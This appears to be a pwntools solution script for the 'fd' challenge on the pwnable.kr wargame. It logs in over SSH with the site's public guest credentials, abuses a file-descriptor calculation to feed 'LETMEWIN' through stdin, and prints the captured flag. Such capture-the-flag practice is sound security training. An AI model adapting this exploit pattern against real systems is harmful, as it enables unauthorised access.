#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
shell = ssh('fd', 'pwnable.kr', password='guest', port=2222)
# make ssh connection
shell.download_file('./fd.c')
# download binary source code
sh = shell.run('./fd ' + str(0x1234))
# linux file descriptor : 0(stdin), 1(stdout), 2(stderr)
sh.sendline('LETMEWIN') # send string
recv = sh.recvall(timeout=5).decode()
print(recv)
# print received string(contains flag)
log.info('FLAG : ' + recv.split('\n')[1])
